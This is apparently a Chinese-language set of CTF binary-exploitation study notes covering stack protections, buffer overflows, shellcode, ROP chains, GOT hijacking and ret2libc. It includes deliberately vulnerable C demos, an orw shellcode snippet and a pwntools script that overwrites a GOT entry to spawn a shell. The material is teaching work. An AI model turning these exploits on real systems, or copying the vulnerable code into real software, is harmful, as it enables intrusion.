+<h3 id="stack-canary"><a href="#stack-canary" class="headerlink" title="stack canary"></a>stack canary</h3><p>在retuen address前面加一層8 bytes的隨機值，return 前檢查是否相同，不同就會crash</p>
+<p>特徵是程式disassemble底下會有像是<code>stack_chk</code>之類的function</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -o test -fno-stack-protector  #不開啟</span><br><span class="line">gcc test.c -o test -fstack-protector     #只保護部分函數</span><br><span class="line">gcc test.c -o test -fstack-protector-all #所有函數都加入canary</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Stack]</span><br><span class="line">|   stack Variables   |</span><br><span class="line">|     Canary Value    | &lt;-- canary value</span><br><span class="line">|      old rbp        |</span><br><span class="line">|   Return Address    |</span><br><span class="line">-----------------------</span><br></pre></td></tr></table></figure>
+
+<h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p>寫入及執行權限不同時存在，所以不太能寫shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execstack // 禁用NX</span><br><span class="line">noexecstack // 開NX</span><br></pre></td></tr></table></figure>
+
+<h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>.text、.data、.bss地址隨機</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-no-pie #關閉PIE</span><br></pre></td></tr></table></figure>
+
+<h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>library、heap、stack 隨機化</p>
+<h3 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a>seccomp</h3><p>可以禁用掉一下syscall，如execve、system這些危險函數</p>
+<p>可以用這東西看禁用了哪些<br><a target="_blank" rel="noopener" href="https://github.com/david942j/seccomp-tools">https://github.com/david942j/seccomp-tools</a><br><img src="https://hackmd.io/_uploads/H1tFl-RwA.png" alt="image"></p>
+<h2 id="register"><a href="#register" class="headerlink" title="register"></a>register</h2><p><img src="https://hackmd.io/_uploads/BycK5Jr9A.png" alt="image"></p>
+<h2 id="oob"><a href="#oob" class="headerlink" title="oob"></a>oob</h2><p>一個陣列，若對於輸入的索引沒有限制，就可以讀到陣列外stack上的資料</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr[i] (int) = *(arr + i *sizeof(int)) </span><br></pre></td></tr></table></figure>
+
+<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int overflow"></a>int overflow</h2><table>
+<thead>
+<tr>
+<th>類型</th>
+<th>byte</th>
+<th>範圍</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>short int</td>
+<td>2byte(word)</td>
+<td>0 ~ 32767(0 ~ 0x7fff) 及 -32768 ~ -1(0x8000~0xffff)</td>
+</tr>
+<tr>
+<td>unsigned short int</td>
+<td>2byte(word)</td>
+<td>0 ~ 65535(0 ~ 0xffff)</td>
+</tr>
+<tr>
+<td>int</td>
+<td>4byte(dword)</td>
+<td>0 ~ 2147483647(0 ~ 0x7fffffff) 及 -2147483648 ~ -1 (0x80000000 ~ 0xffffffff)</td>
+</tr>
+<tr>
+<td>unsigned int</td>
+<td>4byte(dword)</td>
+<td>0 ~ 4294967295(0 ~ 0xffffffff)</td>
+</tr>
+<tr>
+<td>long int</td>
+<td>8byte(qword)</td>
+<td>0 ~ 0x7fffffffffffffff 及 0x8000000000000000 ~ 0xffffffffffffffff(負)</td>
+</tr>
+<tr>
+<td>unsigned long int</td>
+<td>8byte(qword)</td>
+<td>0 ~ 0xffffffffffffffff</td>
+</tr>
+</tbody></table>
+<h2 id="partial-overwrite"><a href="#partial-overwrite" class="headerlink" title="partial overwrite"></a>partial overwrite</h2><p>printf會印到直到碰到<code>\x00</code>，所以如果可以把canary、或stack 上libc的<code>\x00</code>蓋掉，就可以leak canary或各種值</p>
+<h2 id="stack-堆疊"><a href="#stack-堆疊" class="headerlink" title="stack(堆疊)"></a>stack(堆疊)</h2><p><img src="https://hackmd.io/_uploads/H1cqZ-RPR.png" alt="image"></p>
+<h3 id="old-rbp"><a href="#old-rbp" class="headerlink" title="old rbp"></a>old rbp</h3><ul>
+<li>產生原因:一開始做了push rbp，所以rbp被丟到了stack上，通常為了stack平衡所以最後會leave，來pop rbp</li>
+<li>如果一開始沒有push rbp，通常也就不會有leave</li>
+</ul>
+<h3 id="stack-return-address"><a href="#stack-return-address" class="headerlink" title="stack return address"></a>stack return address</h3><ul>
+<li>call function前會先將return address存到stack</li>
+<li>這樣function結束後就可以從stack拿出return address</li>
+</ul>
+<h2 id="buffer-ovweflow"><a href="#buffer-ovweflow" class="headerlink" title="buffer ovweflow"></a>buffer ovweflow</h2><p>輸入如果沒有上限，就可以一直寫到return address來控制程式流程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gets、strcpy、strncpy、scanf、read(長度沒寫好)...</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">	gets(buffer);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/Bkk5MbADC.png" alt="image"></p>
+<h3 id="return2code"><a href="#return2code" class="headerlink" title="return2code"></a>return2code</h3><p>透過BOF把return address 改到code任意處</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">shell</span><span class="params">()</span>&#123;</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">	gets(buffer);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>這邊要注意一件事，跳過去時要注意該位址存不存在push rbp之類的，如果有要往後跳一點</p>
+<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><ul>
+<li>須關閉NX</li>
+<li>return到自己寫的shellcode</li>
+<li>不要蓋掉重要的程式</li>
+<li>看有rwx,-wx(gdb)</li>
+</ul>
+<p>Shellcode:<br><a target="_blank" rel="noopener" href="https://shell-storm.org/shellcode/index.html">https://shell-storm.org/shellcode/index.html</a><br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits">https://www.exploit-db.com/exploits</a></p>
+<p>可以自己寫shellcode</p>
+<h4 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sc = asm(<span class="string">&#x27;\n\n&#x27;</span>.join([</span><br><span class="line">    <span class="string">&#x27;push %d&#x27;</span> % u32(<span class="string">&#x27;ag\0\0&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;push %d&#x27;</span> % u32(<span class="string">&#x27;w/fl&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;push %d&#x27;</span> % u32(<span class="string">&#x27;e/or&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;push %d&#x27;</span> % u32(<span class="string">&#x27;/hom&#x27;</span>), </span><br><span class="line">    <span class="string">&#x27;xor edx, edx&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;xor ecx, ecx&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mov ebx, esp&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;mov eax, 5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;int 0x80&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;mov edx, 128&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mov ecx, esp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mov ebx, eax&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mov eax, 3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;int 0x80&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;mov edx, eax&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;mov ecx, esp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mov ebx, 0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mov eax, 4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;int 0x80&#x27;</span></span><br><span class="line">]))</span><br></pre></td></tr></table></figure>
+
+<h4 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h4><p>可以改一塊記憶體權限，並在上面做更多操作<br>sys_mprotect</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect(<span class="type">const</span> <span class="type">void</span> *start, <span class="type">size_t</span> len, <span class="type">int</span> prot);</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>register</th>
+<th>value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>rax</td>
+<td>10</td>
+</tr>
+<tr>
+<td>rdi</td>
+<td>開始的address</td>
+</tr>
+<tr>
+<td>rsi</td>
+<td>長度</td>
+</tr>
+<tr>
+<td>rdx</td>
+<td>rwx</td>
+</tr>
+</tbody></table>
+<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><ul>
+<li>結尾是<code>ret</code> 或是 <code>jump &lt;addr&gt;</code>的gadget<ul>
+<li>可以控制register</li>
+<li>可對任意address寫入資料</li>
+<li>syscall</li>
+</ul>
+</li>
+<li>ROPgadget尋找適合的gadget</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./&lt;your binary&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="ROP-chain"><a href="#ROP-chain" class="headerlink" title="ROP chain"></a>ROP chain</h3><p>我們可以找可以控制register的gadget，串成一條鏈，設定好register後call syscall</p>
+<p>stack -&gt; call execve</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pop rax</span><br><span class="line">0x3b</span><br><span class="line">pop rdi</span><br><span class="line">command_addr_in_stack</span><br><span class="line">pop rsi</span><br><span class="line">0</span><br><span class="line">pop rdx;</span><br><span class="line">0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md</a></p>
+<h4 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h4><p><a target="_blank" rel="noopener" href="https://hackmd.io/@naup96321/SkGljHPZC">https://hackmd.io/@naup96321/SkGljHPZC</a></p>
+<h2 id="stack-migration"><a href="#stack-migration" class="headerlink" title="stack migration"></a>stack migration</h2><p><a target="_blank" rel="noopener" href="https://hackmd.io/@naup96321/B1FUxutQC">https://hackmd.io/@naup96321/B1FUxutQC</a></p>
+<h2 id="Fixed-Size-Migration"><a href="#Fixed-Size-Migration" class="headerlink" title="Fixed Size Migration"></a>Fixed Size Migration</h2><p><a target="_blank" rel="noopener" href="https://hackmd.io/@naup96321/Hyown32m0">https://hackmd.io/@naup96321/Hyown32m0</a></p>
+<h2 id="libc-相關"><a href="#libc-相關" class="headerlink" title="libc 相關"></a>libc 相關</h2><h3 id="libc是啥"><a href="#libc是啥" class="headerlink" title="libc是啥"></a>libc是啥</h3><p>如果把所有函數都包進去程式，那整個檔案就會很肥，所以把函式備份在每個人的電腦裡，再透過一些機制去把它拿出來</p>
+<h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><p>把所有函式包進去ELF</p>
+<h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc static.c -o static --static</span><br></pre></td></tr></table></figure>
+
+<p>static沒有libc段<br><img src="https://hackmd.io/_uploads/rye5vZAPA.png" alt="image"></p>
+<p>並且可以發現他把函式實現方式都直接包進去了<br><img src="https://hackmd.io/_uploads/SyuRPb0PC.png" alt="image"></p>
+<h3 id="dynamic"><a href="#dynamic" class="headerlink" title="dynamic"></a>dynamic</h3><p>libc函數在dynamic link時候都是透過GOT表來進行跳轉找到函式的</p>
+<h3 id="GOT（global-offset-table）"><a href="#GOT（global-offset-table）" class="headerlink" title="GOT（global offset table）"></a>GOT（global offset table）</h3><p>GOT存著很多個一樣大小的元素，形成一個table(基本上就是array)。每個元素都是一個指標(32bit-&gt;4 byte，64bit -&gt; 8 byte)，指向程式所需要的變數或者是函數</p>
+<table>
+<thead>
+<tr>
+<th>位置</th>
+<th>內容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>.got</td>
+<td>全域變數的位置</td>
+</tr>
+<tr>
+<td>.got.plt</td>
+<td>儲存的則是其他library中函式的位置</td>
+</tr>
+</tbody></table>
+<h2 id="PLT-procedure-linkage-table"><a href="#PLT-procedure-linkage-table" class="headerlink" title="PLT(procedure linkage table)"></a>PLT(procedure linkage table)</h2><p>PLT存著很多個一樣大小的元素，形成一個table</p>
+<p>第一個元素是公共plt，負責呼叫動態鏈接器。從第二個開始每個元素分別對應到一個動態鏈接的函數</p>
+<h3 id="dynamic-link"><a href="#dynamic-link" class="headerlink" title="dynamic link"></a>dynamic link</h3><ul>
+<li>當程式碼中 Call Printf()，在對應的組語會看見 看到call printf@plt。</li>
+<li>printf@GOT會回去向.got.plt取值</li>
+<li>由於是第一次使用函數，在GOT 表中並不會找到該函數地址，因此必須透過 PLT 將 GOT 重定位</li>
+<li>將找到的函數位置所需的參數 推入 stack中</li>
+<li>透過執行dl_runtime_resolve 找出函式位址</li>
+<li>系統就會把 function 的位址寫進 .got.plt 當中</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/HJhKIbAvR.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/BkBCu-RwA.png" alt="image"></p>
+<h2 id="GOT-hijack"><a href="#GOT-hijack" class="headerlink" title="GOT hijack"></a>GOT hijack</h2><p>如果我可以改寫GOT，那我就可以跳到我指定的位置<br>例如，我把puts GOT內容改成system plt，那他就會抓到system address，那只要call puts就會呼叫到system</p>
+<p><img src="https://hackmd.io/_uploads/HkdLF-0DR.png" alt="image"></p>
+<h3 id="demo-1"><a href="#demo-1" class="headerlink" title="demo"></a>demo</h3><p>source code</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc gothijack.c -o gothijack -z lazy</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="built_in">array</span>[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1: set\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2: get\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> value;</span><br><span class="line"></span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%256s&quot;</span>, buf);</span><br><span class="line">        choice = atoi(buf);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;idx:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;value:\n&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%llu&quot;</span>, &amp;value);</span><br><span class="line">            <span class="built_in">array</span>[idx] = value;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%#llx\n&quot;</span>, <span class="built_in">array</span>[idx]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>分析一下發現idx並沒有限制，所以可以透過輸入非預期的範圍來oob寫到其他位置，這邊先看一下array位置<br>0x555555558080<br><img src="https://hackmd.io/_uploads/B1Z51Y1KR.png" alt="image"></p>
+<p>然後看GOT的位置<br><img src="https://hackmd.io/_uploads/SkG21FkKR.png" alt="image"><br><img src="https://hackmd.io/_uploads/Hy-yxFJKA.png" alt="image"></p>
+<p>0x4030(<a href="mailto:&#97;&#116;&#x6f;&#x69;&#64;&#x47;&#76;&#73;&#x42;&#x43;&#95;&#x32;&#46;&#50;&#x2e;&#53;">&#97;&#116;&#x6f;&#x69;&#64;&#x47;&#76;&#73;&#x42;&#x43;&#95;&#x32;&#46;&#50;&#x2e;&#53;</a>)+0x555555554000&#x3D;0x555555558030</p>
+<p>輸入-10就可以對該位置任意讀寫了<br><img src="https://hackmd.io/_uploads/SJE-gY1K0.png" alt="image"></p>
+<p>再來是要把他atoi改寫成libc system然後跳到上面去</p>
+<h3 id="script"><a href="#script" class="headerlink" title="script"></a>script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    debug_init()</span><br><span class="line">    r=process(<span class="string">&#x27;./gothijack&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc naup.com 2000&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;2: get\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;idx:\n&#x27;</span>,<span class="string">b&#x27;-10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leaklibc=<span class="built_in">int</span>(r.recvline().strip().decode(),<span class="number">16</span>)</span><br><span class="line">offset=<span class="number">0x43640</span></span><br><span class="line">libc_base=leaklibc-offset</span><br><span class="line"></span><br><span class="line">NAUPINFO(<span class="string">&#x27;LEAK_LIBC&#x27;</span>,<span class="built_in">hex</span>(leaklibc))</span><br><span class="line">NAUPINFO(<span class="string">&#x27;LIBC_BASE&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_offset=<span class="number">0x50d70</span></span><br><span class="line">libc_system=system_offset+libc_base</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;2: get\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;idx:\n&#x27;</span>,<span class="string">b&#x27;-10&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;value:\n&#x27;</span>,<span class="built_in">str</span>(libc_system).encode())</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><ul>
+<li>若能得知 libc base，則可以計算出 libc 中 function 的位置，便能調⽤ library 中的函式。</li>
+<li>關鍵為 bypass ASLR，找出 libc 的隨機 base<ul>
+<li>透過 information leak 漏洞，洩漏 memory 上的內容，獲取屬於 libcsegment 的 address</li>
+<li>此 address 會是隨機的 base address 加上⼀固定位移植 ofset (不同版本的 libc ofset 不同)</li>
+</ul>
+</li>
+</ul>
+<p>看libc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -a &lt;your libc&gt; | less</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>libc base只能在執行中leak出來<br>1.尋找執行中用到的libc位置<br>2.stack殘渣</li>
+</ul>
+<h3 id="算libc-base"><a href="#算libc-base" class="headerlink" title="算libc base"></a>算libc base</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puts_got_value = libc_base + puts_libc</span><br><span class="line">libc_base = puts_got_value - puts_libc</span><br></pre></td></tr></table></figure>
+<p>可以確認最後1.5 byte是否為000，來確認算出的base正不正確</p>
+<h3 id="demo-2"><a href="#demo-2" class="headerlink" title="demo"></a>demo</h3><p><a target="_blank" rel="noopener" href="https://hackmd.io/@naup96321/rynMnRBmR">https://hackmd.io/@naup96321/rynMnRBmR</a></p>
+<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13313?time__1311=GqmxuD2DgQi=D=D/D0erGktKq0KlPgr4rD">https://xz.aliyun.com/t/13313?time__1311=GqmxuD2DgQi%3DD%3DD%2FD0erGktKq0KlPgr4rD</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span 